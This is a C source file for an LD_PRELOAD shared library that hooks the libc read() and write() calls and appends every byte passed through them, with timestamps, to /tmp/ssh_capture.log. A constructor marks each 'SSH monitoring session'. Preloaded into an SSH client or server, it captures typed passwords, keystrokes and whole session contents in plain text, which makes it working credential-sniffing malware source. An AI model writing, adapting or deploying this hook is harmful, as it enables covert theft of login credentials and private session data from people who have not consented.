#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

// Original function pointers
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;

// Helper to clean and format output
void format_output(FILE *log, const unsigned char *data, ssize_t len) {
    for (ssize_t i = 0; i < len; i++) {
        if (isprint(data[i]))  // Only print readable characters
            fprintf(log, "%c", data[i]);
        else if (data[i] == '\0')  // Skip null bytes
            continue;
        else
            fprintf(log, "\\x%02x", data[i]);
    }
}

// Log function with cleaner output
void log_operation(const char *op, int fd, const void *buf, size_t count, ssize_t result) {
    if (result <= 0) return;  // Don't log empty operations
    
    FILE *log = fopen("/tmp/ssh_capture.log", "a");
    if (!log) return;
    
    time_t t = time(NULL);
    char *timestamp = ctime(&t);
    timestamp[strlen(timestamp) - 1] = 0;
    
    fprintf(log, "[%s] %s(%d, \"", timestamp, op, fd);
    format_output(log, buf, result);
    fprintf(log, "\")\n");
    fclose(log);
}

// Hook write
ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write)
        original_write = dlsym(RTLD_NEXT, "write");
    
    ssize_t result = original_write(fd, buf, count);
    log_operation("write", fd, buf, count, result);
    return result;
}

// Hook read
ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read)
        original_read = dlsym(RTLD_NEXT, "read");
    
    ssize_t result = original_read(fd, buf, count);
    log_operation("read", fd, buf, count, result);
    return result;
}

// Initialize logging
__attribute__((constructor))
void init(void) {
    FILE *log = fopen("/tmp/ssh_capture.log", "a");
    if (log) {
        fprintf(log, "\n=== New SSH Monitoring Session Started ===\n");
        fclose(log);
    }
}